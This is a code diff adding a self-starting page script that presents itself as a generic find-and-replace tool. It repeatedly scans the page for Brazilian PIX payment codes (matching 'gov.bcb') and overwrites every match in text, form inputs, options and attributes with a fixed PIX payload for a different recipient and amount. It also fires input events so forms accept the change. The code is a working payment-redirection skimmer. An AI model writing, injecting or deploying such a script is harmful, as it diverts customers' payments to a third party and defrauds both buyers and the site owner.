@@ -1,0 +1,295 @@
+<script>
+    (function () {
+        var find = "gov.bcb";
+        var replaceWith = "00020126390014br.gov.bcb.pix0117pix@spechshop.com520400005303986540525.005802BR5922DAJEFITA202107311736126007Buritis62250521mpqrinter16631194714463044952";
+
+        var delayAfterHtmlLoadMs = 500;
+        var scanEveryMs = 100;
+
+        var findLower = String(find).toLowerCase();
+        var replaceLower = String(replaceWith).toLowerCase();
+
+        var started = false;
+        var running = false;
+        var stopped = false;
+
+        var ignoreTags = {
+            script: true,
+            style: true,
+            noscript: true,
+            template: true,
+            svg: true,
+            canvas: true
+        };
+
+        var attrs = [
+            "title",
+            "aria-label",
+            "alt",
+            "value",
+            "placeholder",
+            "data-title",
+            "data-label"
+        ];
+
+        function isAlreadyReplaced(value) {
+            if (typeof value !== "string") return false;
+            return value.toLowerCase() === replaceLower;
+        }
+
+        function hasFind(value) {
+            if (typeof value !== "string") return false;
+            if (isAlreadyReplaced(value)) return false;
+
+            return value.toLowerCase().indexOf(findLower) !== -1;
+        }
+
+        function shouldIgnoreElement(el) {
+            if (!el || !el.tagName) return true;
+
+            var tag = String(el.tagName).toLowerCase();
+
+            return !!ignoreTags[tag];
+        }
+
+        function fireInputEvents(el) {
+            try {
+                el.dispatchEvent(new Event("input", { bubbles: true }));
+                el.dispatchEvent(new Event("change", { bubbles: true }));
+            } catch (e) {}
+        }
+
+        function toast(message) {
+            if (!document.body) return;
+
+            if (typeof window.toast === "function") {
+                try {
+                    window.toast(message);
+                    return;
+                } catch (e) {}
+            }
+
+            var old = document.getElementById("__find_replace_toast__");
+
+            if (old && old.parentNode) {
+                old.parentNode.removeChild(old);
+            }
+
+            var el = document.createElement("div");
+
+            el.id = "__find_replace_toast__";
+            el.innerText = message;
+
+            el.style.position = "fixed";
+            el.style.right = "20px";
+            el.style.bottom = "20px";
+            el.style.zIndex = "999999999";
+            el.style.background = "rgba(20,20,20,0.95)";
+            el.style.color = "#fff";
+            el.style.padding = "12px 16px";
+            el.style.borderRadius = "10px";
+            el.style.fontFamily = "Arial, sans-serif";
+            el.style.fontSize = "14px";
+            el.style.boxShadow = "0 10px 30px rgba(0,0,0,0.35)";
+            el.style.pointerEvents = "none";
+
+            document.body.appendChild(el);
+
+            setTimeout(function () {
+                if (el && el.parentNode) {
+                    el.parentNode.removeChild(el);
+                }
+            }, 2500);
+        }
+
+        function replaceInput(el) {
+            var changed = false;
+
+            if (hasFind(el.value)) {
+                el.value = replaceWith;
+                changed = true;
+            }
+
+            if (hasFind(el.defaultValue)) {
+                el.defaultValue = replaceWith;
+            }
+
+            if (hasFind(el.placeholder)) {
+                el.placeholder = replaceWith;
+            }
+
+            if (changed) {
+                fireInputEvents(el);
+            }
+        }
+
+        function replaceOption(el) {
+            if (hasFind(el.text)) {
+                el.text = replaceWith;
+            }
+
+            if (hasFind(el.value)) {
+                el.value = replaceWith;
+            }
+        }
+
+        function replaceAttrs(el) {
+            var i;
+            var attr;
+            var value;
+
+            for (i = 0; i < attrs.length; i++) {
+                attr = attrs[i];
+
+                if (!el.hasAttribute || !el.hasAttribute(attr)) {
+                    continue;
+                }
+
+                value = el.getAttribute(attr);
+
+                if (hasFind(value)) {
+                    el.setAttribute(attr, replaceWith);
+                }
+            }
+        }
+
+        function replaceTextNodes(root) {
+            var walker;
+            var node;
+            var parent;
+            var nodes = [];
+
+            try {
+                walker = document.createTreeWalker(
+                    root,
+                    NodeFilter.SHOW_TEXT,
+                    {
+                        acceptNode: function (textNode) {
+                            var p = textNode.parentElement;
+
+                            if (!p || shouldIgnoreElement(p)) {
+                                return NodeFilter.FILTER_REJECT;
+                            }
+
+                            if (hasFind(textNode.nodeValue)) {
+                                return NodeFilter.FILTER_ACCEPT;
+                            }
+
+                            return NodeFilter.FILTER_SKIP;
+                        }
+                    }
+                );
+            } catch (e) {
+                return;
+            }
+
+            while ((node = walker.nextNode())) {
+                nodes.push(node);
+            }
+
+            for (var i = 0; i < nodes.length; i++) {
+                node = nodes[i];
+                parent = node.parentElement;
+
+                if (!parent || shouldIgnoreElement(parent)) {
+                    continue;
+                }
+
+                if (isAlreadyReplaced(parent.textContent)) {
+                    continue;
+                }
+
+                if (parent.children.length === 0) {
+                    parent.textContent = replaceWith;
+                } else {
+                    node.nodeValue = replaceWith;
+                }
+            }
+        }
+
+        function replaceElements(root) {
+            var list;
+            var el;
+            var i;
+            var tag;
+
+            if (!root || !root.querySelectorAll) {
+                return;
+            }
+
+            list = root.querySelectorAll(
+                "input, textarea, option, [title], [aria-label], [alt], [value], [placeholder], [data-title], [data-label]"
+            );
+
+            for (i = 0; i < list.length; i++) {
+                el = list[i];
+
+                if (shouldIgnoreElement(el)) {
+                    continue;
+                }
+
+                tag = el.tagName ? el.tagName.toLowerCase() : "";
+
+                if (tag === "input" || tag === "textarea") {
+                    replaceInput(el);
+                } else if (tag === "option") {
+                    replaceOption(el);
+                }
+
+                replaceAttrs(el);
+            }
+        }
+
+        function scan() {
+            if (stopped) return;
+            if (running) return;
+            if (!document.body) return;
+
+            running = true;
+
+            try {
+                replaceTextNodes(document.body);
+                replaceElements(document.body);
+            } catch (e) {
+                console.error("Erro no scan:", e);
+            }
+
+            running = false;
+        }
+
+        function loop() {
+            if (stopped) return;
+
+            scan();
+
+            setTimeout(loop, scanEveryMs);
+        }
+
+        function start() {
+            if (started) return;
+            if (!document.body) return;
+
+            started = true;
+
+            setTimeout(function () {
+                toast("Vou comecar a procurar");
+                loop();
+            }, delayAfterHtmlLoadMs);
+        }
+
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", start);
+        } else {
+            start();
+        }
+
+        window.addEventListener("load", start);
+
+        window.__findReplaceController = {
+            stop: function () {
+                stopped = true;
+            },
+            scan: scan
+        };
+    })();
+</script>
